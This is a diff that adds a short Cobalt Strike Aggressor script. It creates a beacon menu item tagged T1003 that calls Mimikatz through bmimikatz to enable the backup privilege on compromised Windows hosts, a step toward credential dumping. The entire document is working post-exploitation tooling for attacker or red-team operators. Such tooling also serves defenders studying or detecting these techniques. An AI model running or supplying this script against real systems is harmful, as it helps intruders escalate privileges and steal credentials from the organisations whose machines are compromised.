@@ -1,0 +1,12 @@
+# Mimikatz Backup Privilege
+item "Mimikatz - Backup Privilege  - T1003"{
+	local ('$bid');
+		foreach $bid ($1){
+			backup($bid);
+		}
+}
+
+#Mimikatz Backup Privilege
+sub backup{
+bmimikatz($1, "privilege::backup");
+}
